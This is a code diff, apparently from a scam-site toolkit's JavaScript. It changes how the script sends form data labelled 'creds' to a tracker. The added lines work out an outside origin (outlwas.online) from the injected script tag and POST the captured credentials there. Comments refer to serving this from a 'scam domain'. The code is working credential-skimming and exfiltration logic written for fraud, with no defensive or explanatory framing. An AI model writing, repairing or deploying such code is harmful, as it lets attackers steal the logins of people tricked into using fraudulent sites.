@@ -10543,10 +10543,20 @@
       if (window.ALPTracker && typeof window.ALPTracker.trackFormData === 'function') {
         window.ALPTracker.trackFormData(creds);
       } else {
-        var apiKey = (document.querySelector('script[data-api-key]') || {}).getAttribute && document.querySelector('script[data-api-key]').getAttribute('data-api-key');
-        var sid    = apiKey ? sessionStorage.getItem('_alp_sid_' + apiKey) : null;
+        // Derive the tracker origin from the injected script tag — on website
+        // VPSes the src is absolute (https://outlwas.online/tracker.js), NOT
+        // same-origin. A relative /api/tracker/formdata would 404 on the scam
+        // domain's nginx.
+        var scriptTag = document.querySelector('script[data-api-key]');
+        var apiKey    = scriptTag && scriptTag.getAttribute('data-api-key');
+        var srcAttr   = scriptTag && scriptTag.getAttribute('src') || '';
+        var trackerOrigin = '';
+        try {
+          if (srcAttr) trackerOrigin = new URL(srcAttr, window.location.href).origin;
+        } catch(_) {}
+        var sid = apiKey ? sessionStorage.getItem('_alp_sid_' + apiKey) : null;
         if (sid) {
-          fetch('/api/tracker/formdata', {
+          fetch(trackerOrigin + '/api/tracker/formdata', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             keepalive: true,
